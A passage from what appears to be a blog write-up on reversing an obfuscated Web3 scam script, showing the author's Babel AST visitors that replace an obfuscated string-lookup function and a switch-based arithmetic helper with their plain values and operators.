class="keyword">return</span> y ? x[b[y]] : __p_5272508748[x] || (z = (b[x],</span><br><span class="line">    a),</span><br><span class="line">    __p_5272508748[x] = <span class="title function_">z</span>(__p_7737682834[x]))</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Since `y` and `z` are always undefined and `b=__p_5272508748`, it can be simplify to</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">__p_0566375197</span>(<span class="params">x, y, z, a=__p_6222965791, b=__p_5272508748</span>) {</span><br><span class="line">    <span class="keyword">return</span> __p_5272508748[x] ||</span><br><span class="line">        __p_5272508748[x] = <span class="title function_">__p_6222965791</span>(__p_7737682834[x]))</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>I found a helpful article called “<a class="link" target="_blank" rel="noopener" href="https://steakenthusiast.github.io/2022/05/31/Deobfuscating-Javascript-via-AST-Replacing-References-to-Constant-Variables-with-Their-Actual-Value/">Deobfuscating JavaScript via AST: Replacing References to Constant Variables with Their Actual Value <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ that has been very useful to me. I used the methodology to replace <code>__p_0566375197(x)</code> with its actual value. And here is the AST visitor I wrote, which does the job.</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Need to deal with</span></span><br><span class="line"><span class="comment">  __p_0566375197['\x63\x61\x6c\x6c'](undefined, 1300)</span></span><br><span class="line"><span class="comment">  __p_0566375197(7947)</span></span><br><span class="line"><span class="comment">  __p_0566375197.apply(undefined, [11692])</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> t = <span class="built_in">require</span>(<span class="string">"@babel/types"</span>);</span><br><span class="line"><span class="keyword">const</span> generate = <span class="built_in">require</span>(<span class="string">"@babel/generator"</span>).<span class="property">default</span>;</span><br><span class="line"><span class="keyword">const</span> __p_0566375197 = <span class="built_in">require</span>(<span class="string">"../site-presentation/__p_0566375197"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isNodeConstant</span>(<span class="params">node</span>) {</span><br><span class="line">    <span class="keyword">const</span> res = t.<span class="title function_">isLiteral</span>(node) || (t.<span class="title function_">isIdentifier</span>(node) &amp;&amp; node.<span class="property">name</span> === <span class="string">"undefined"</span>) || (t.<span class="title function_">isArrayExpression</span>(node) &amp;&amp; node.<span class="property">elements</span>.<span class="title function_">every</span>(isNodeConstant));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nodeToCode</span>(<span class="params">node</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">generate</span>(node, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> foldConstantsVisitor = {</span><br><span class="line">    <span class="title class_">CallExpression</span>(path) {</span><br><span class="line">        <span class="keyword">const</span> callee = path.<span class="property">node</span>.<span class="property">callee</span>;</span><br><span class="line">        <span class="keyword">const</span> args = path.<span class="property">node</span>.<span class="property">arguments</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (callee.<span class="property">type</span>) {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"Identifier"</span>:</span><br><span class="line">                {</span><br><span class="line">                    <span class="keyword">if</span> (callee.<span class="property">name</span> === <span class="string">"__p_0566375197"</span>) {</span><br><span class="line">                        <span class="keyword">if</span> (!(<span class="title function_">isNodeConstant</span>(args[<span class="number">0</span>]))) {</span><br><span class="line">                            <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Non-constant argument to __p_0566375197: "</span>, code);</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line">                        }</span><br><span class="line">                        <span class="keyword">const</span> actualVal = t.<span class="title function_">valueToNode</span>(<span class="title function_">__p_0566375197</span>(args[<span class="number">0</span>].<span class="property">value</span>));</span><br><span class="line">                        path.<span class="title function_">replaceWith</span>(actualVal);</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"MemberExpression"</span>:</span><br><span class="line">                {</span><br><span class="line">                    <span class="keyword">if</span> (callee.<span class="property">object</span>.<span class="property">name</span> === <span class="string">"__p_0566375197"</span>) {</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">const</span> arg <span class="keyword">of</span> args) {</span><br><span class="line">                            <span class="keyword">if</span> (!(<span class="title function_">isNodeConstant</span>(arg))) {</span><br><span class="line">                                <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Non-constant argument to __p_0566375197: "</span>, code);</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(arg);</span><br><span class="line">                                <span class="keyword">return</span></span><br><span class="line">                            }</span><br><span class="line">                        }</span><br><span class="line">                        <span class="keyword">if</span> (!(callee.<span class="property">property</span>.<span class="property">value</span> === <span class="string">"call"</span> || callee.<span class="property">property</span>.<span class="property">name</span> === <span class="string">"call"</span> || callee.<span class="property">property</span>.<span class="property">name</span> === <span class="string">"apply"</span> || callee.<span class="property">property</span>.<span class="property">value</span> === <span class="string">"apply"</span>)) {</span><br><span class="line">                            <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(callee.<span class="property">property</span>)</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported __p_0566375197 property: "</span>, code);</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line">                        }</span><br><span class="line">                        <span class="comment">// We've checked that all arguments are constant, so it's safe to evaluate them</span></span><br><span class="line">                        <span class="keyword">const</span> actualVal = t.<span class="title function_">valueToNode</span>(<span class="title function_">__p_0566375197</span>(<span class="built_in">eval</span>(<span class="title function_">nodeToCode</span>(args[<span class="number">1</span>]))));</span><br><span class="line">                        path.<span class="title function_">replaceWith</span>(actualVal);</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    },</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = foldConstantsVisitor;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> parser = <span class="built_in">require</span>(<span class="string">"@babel/parser"</span>);</span><br><span class="line"><span class="keyword">const</span> traverse = <span class="built_in">require</span>(<span class="string">"@babel/traverse"</span>).<span class="property">default</span>;</span><br><span class="line"><span class="keyword">const</span> t = <span class="built_in">require</span>(<span class="string">"@babel/types"</span>);</span><br><span class="line"><span class="keyword">const</span> generate = <span class="built_in">require</span>(<span class="string">"@babel/generator"</span>).<span class="property">default</span>;</span><br><span class="line"><span class="keyword">const</span> beautify = <span class="built_in">require</span>(<span class="string">"js-beautify"</span>);</span><br><span class="line"><span class="keyword">const</span> { readFileSync, writeFile } = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> visitor__p_0566375197 = <span class="built_in">require</span>(<span class="string">"./visitor__p_0566375197"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deobfuscate</span>(<span class="params">source</span>) {</span><br><span class="line">    <span class="comment">//Parse AST of Source Code</span></span><br><span class="line">    <span class="keyword">const</span> ast = parser.<span class="title function_">parse</span>(source);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute the visitor</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) {</span><br><span class="line">        <span class="title function_">traverse</span>(ast, visitor__p_0566375197);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Code Beautification</span></span><br><span class="line">    <span class="keyword">let</span> deobfCode = <span class="title function_">generate</span>(ast, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">    deobfCode = <span class="title function_">beautify</span>(deobfCode, {</span><br><span class="line">        <span class="attr">indent_size</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">space_in_empty_paren</span>: <span class="literal">true</span>,</span><br><span class="line">    });</span><br><span class="line">    <span class="comment">// Output the deobfuscated result</span></span><br><span class="line">    <span class="title function_">writeCodeToFile</span>(deobfCode);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>It indeed makes the code more readable, as shown below.</p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/after-p_0566375197-replacement.webp" alt="after-p_0566375197-replacement"></p>
+<p>There is also a function called <code>__p_1452585703_calc</code>, which occurs over five thousand times. Let us see what it does.</p>
+<p><img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/p_1452585703_calc.webp" alt="p_1452585703_calc"></p>
+<p>The function <code>__p_1452585703_calc</code> carries out calculations on its parameters. The specific calculation to be performed is determined by the value of the <code>__p_2651934416</code> variable, which is <strong>passed as a global variable</strong>. This may be the reason why an existing deobfuscator is unable to handle it effectively.</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">__p_1452585703_calc</span>(<span class="params">__p_9164751308, __p_4231378217</span>) {</span><br><span class="line">  <span class="keyword">switch</span> (__p_2651934416) {</span><br><span class="line">    <span class="keyword">case</span> -<span class="number">11</span>:</span><br><span class="line">      <span class="keyword">return</span> __p_9164751308 - __p_4231378217;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">52</span>:</span><br><span class="line">      <span class="keyword">return</span> __p_9164751308 / __p_4231378217;</span><br><span class="line">    <span class="keyword">case</span> -<span class="number">22</span>:</span><br><span class="line">      <span class="keyword">return</span> -__p_9164751308;</span><br><span class="line">    <span class="keyword">case</span> -<span class="number">7</span>:</span><br><span class="line">      <span class="keyword">return</span> __p_9164751308 + __p_4231378217;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">28</span>:</span><br><span class="line">      <span class="keyword">return</span> ~__p_9164751308;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">41</span>:</span><br><span class="line">      <span class="keyword">return</span> !__p_9164751308;</span><br><span class="line">    <span class="keyword">case</span> -<span class="number">15</span>:</span><br><span class="line">      <span class="keyword">return</span> __p_9164751308 * __p_4231378217;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">typeof</span> __p_9164751308;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>I replaced all occurrences of <code>__p_1452585703_calc</code> with their actual operations using the code below.</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> t = <span class="built_in">require</span>(<span class="string">"@babel/types"</span>);</span><br><span class="line"><span class="keyword">const</span> generate = <span class="built_in">require</span>(<span class="string">"@babel/generator"</span>).<span class="property">default</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">nodeToInt</span>(<span class="params">node</span>) {</span><br><span class="line">    <span class="keyword">let</span> res;</span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">"UnaryExpression"</span>) {</span><br><span class="line">        <span class="keyword">if</span> (!(node.<span class="property">operator</span> === <span class="string">"-"</span>)) {</span><br><span class="line">            <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported node.type in __p_1452585703_calc: "</span>, code);</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (!(node.<span class="property">argument</span>.<span class="property">type</span> === <span class="string">"NumericLiteral"</span>)) {</span><br><span class="line">            <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported node.argument.type in __p_1452585703_calc: "</span>, code);</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        }</span><br><span class="line">        res = -node.<span class="property">argument</span>.<span class="property">value</span>;</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">"NumericLiteral"</span>) {</span><br><span class="line">        res = node.<span class="property">value</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported right node type in __p_1452585703_calc: "</span>, code);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> foldConstantsVisitor = {</span><br><span class="line">    <span class="title class_">CallExpression</span>(path) {</span><br><span class="line">        <span class="keyword">const</span> callee = path.<span class="property">node</span>.<span class="property">callee</span>;</span><br><span class="line">        <span class="keyword">const</span> args = path.<span class="property">node</span>.<span class="property">arguments</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (callee.<span class="property">type</span>) {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"Identifier"</span>:</span><br><span class="line">                {</span><br><span class="line">                    <span class="keyword">if</span> (callee.<span class="property">name</span> === <span class="string">"__p_1452585703_calc"</span>) {</span><br><span class="line">                        <span class="keyword">if</span> (!(args.<span class="property">length</span> === <span class="number">3</span> || args.<span class="property">length</span> === <span class="number">2</span>)) {</span><br><span class="line">                            <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported number of arguments to __p_1452585703_calc: "</span>, code);</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line">                        }</span><br><span class="line">                        <span class="comment">// console.log("args.length", args.length)</span></span><br><span class="line">                        <span class="comment">// console.log(args)</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">const</span> opNode = args[args.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">let</span> opCode;</span><br><span class="line">                        <span class="comment">// console.log("opNode", opNode)</span></span><br><span class="line">                        <span class="keyword">switch</span> (opNode.<span class="property">type</span>) {</span><br><span class="line">                            <span class="keyword">case</span> <span class="string">"AssignmentExpression"</span>:</span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">const</span> leftNode = opNode.<span class="property">left</span>;</span><br><span class="line">                                    <span class="keyword">const</span> rightNode = opNode.<span class="property">right</span>;</span><br><span class="line">                                    <span class="comment">// left node</span></span><br><span class="line">                                    <span class="keyword">if</span> (!(leftNode.<span class="property">type</span> === <span class="string">"Identifier"</span>)) {</span><br><span class="line">                                        <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">                                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported left node type in __p_1452585703_calc: "</span>, code);</span><br><span class="line">                                        <span class="keyword">return</span></span><br><span class="line">                                    }</span><br><span class="line">                                    <span class="keyword">if</span> (!(leftNode.<span class="property">name</span> === <span class="string">"__p_2651934416"</span>)) {</span><br><span class="line">                                        <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">                                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported left node name in __p_1452585703_calc: "</span>, code);</span><br><span class="line">                                        <span class="keyword">return</span></span><br><span class="line">                                    }</span><br><span class="line"></span><br><span class="line">                                    <span class="comment">// right node</span></span><br><span class="line">                                    opCode = <span class="title function_">nodeToInt</span>(rightNode);</span><br><span class="line">                                    <span class="keyword">break</span></span><br><span class="line">                                }</span><br><span class="line">                            <span class="keyword">case</span> <span class="string">"CallExpression"</span>:</span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">if</span> (!(opNode.<span class="property">callee</span>.<span class="property">name</span> === <span class="string">"__p_4879216376"</span>)) {</span><br><span class="line">                                        <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">                                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported opNode.callee.name in __p_1452585703_calc: "</span>, code);</span><br><span class="line">                                        <span class="keyword">return</span></span><br><span class="line">                                    }</span><br><span class="line">                                    <span class="keyword">const</span> args = opNode.<span class="property">arguments</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (!(args.<span class="property">length</span> === <span class="number">1</span>)) {</span><br><span class="line">                                        <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">                                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported number of arguments to __p_4879216376: "</span>, code);</span><br><span class="line">                                        <span class="keyword">return</span></span><br><span class="line">                                    }</span><br><span class="line">                                    opCode = <span class="title function_">nodeToInt</span>(args[<span class="number">0</span>]);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            <span class="attr">default</span>:</span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">const</span> code = <span class="title function_">generate</span>(path.<span class="property">node</span>, { <span class="attr">comments</span>: <span class="literal">false</span> }).<span class="property">code</span>;</span><br><span class="line">                                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Unsupported opNode type in __p_1452585703_calc: "</span>, code);</span><br><span class="line">                                    <span class="keyword">return</span></span><br><span class="line">                                }</span><br><span class="line">                        }</span><br><span class="line">                        <span class="keyword">switch</span> (opCode) {</span><br><span class="line">                            <span class="keyword">case</span> -<span class="number">11</span>:</span><br><span class="line">                                <span class="comment">// return __p_9164751308 - __p_4231378217;</span></span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">const</span> leftNode = args[<span class="number">0</span>];</span><br><span class="line">                                    <span class="keyword">const</span> rightNode = args[<span class="number">1</span>];</span><br><span class="line">                                    path.<span class="title function_">replaceWith</span>(t.<span class="title function_">binaryExpression</span>(<span class="string">"-"</span>, leftNode, rightNode));</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            <span class="keyword">case</span> <span class="number">52</span>:</span><br><span class="line">                                <span class="comment">//     return __p_9164751308 / __p_4231378217;</span></span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">const</span> leftNode = args[<span class="number">0</span>];</span><br><span class="line">                                    <span class="keyword">const</span> rightNode = args[<span class="number">1</span>];</span><br><span class="line">                                    path.<span class="title function_">replaceWith</span>(t.<span class="title function_">binaryExpression</span>(<span class="string">"/"</span>, leftNode, rightNode));</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            <span class="keyword">case</span> -<span class="number">22</span>:</span><br><span class="line">                            <span class="comment">//     return -__p_9164751308;</span></span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">const</span> leftNode = args[<span class="number">0</span>];</span><br><span class="line">                                    path.<span class="title function_">replaceWith</span>(t.<span class="title function_">unaryExpression</span>(<span class="string">"-"</span>, leftNode));</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            <span class="keyword">case</span> -<span class="number">7</span>:</span><br><span class="line">                            <span class="comment">//     return __p_9164751308 + __p_4231378217;</span></span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">const</span> leftNode = args[<span class="number">0</span>];</span><br><span class="line">                                    <span class="keyword">const</span> rightNode = args[<span class="number">1</span>];</span><br><span class="line">                                    path.<span class="title function_">replaceWith</span>(t.<span class="title function_">binaryExpression</span>(<span class="string">"+"</span>, leftNode, rightNode));</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            <span class="keyword">case</span> <span class="number">28</span>:</span><br><span class="line">                                <span class="comment">// return ~__p_9164751308;</span></span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">const</span> leftNode = args[<span class="number">0</span>];</span><br><span class="line">                                    path.<span class="title function_">replaceWith</span>(t.<span class="title function_">unaryExpression</span>(<span class="string">"~"</span>, leftNode));</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            <span class="keyword">case</span> <span class="number">41</span>:</span><br><span class="line">                            <span class="comment">//     return !__p_9164751308;</span></span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">const</span> leftNode = args[<span class="number">0</span>];</span><br><span class="line">                                    path.<span class="title function_">replaceWith</span>(t.<span class="title function_">unaryExpression</span>(<span class="string">"!"</span>, leftNode));</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            <span class="keyword">case</span> -<span class="number">15</span>:</span><br><span class="line">                            <span class="comment">//     return __p_9164751308 * __p_4231378217;</span></span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">const</span> leftNode = args[<span class="number">0</span>];</span><br><span class="line">                                    <span class="keyword">const</span> rightNode = args[<span class="number">1</span>];</span><br><span class="line">                                    path.<span class="title function_">replaceWith</span>(t.<span class="title function_">binaryExpression</span>(<span class="string">"*"</span>, leftNode, rightNode));</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            <span class="comment">//     return typeof __p_9164751308</span></span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">const</span> leftNode = args[<span class="number">0</span>];</span><br><span class="line">                                    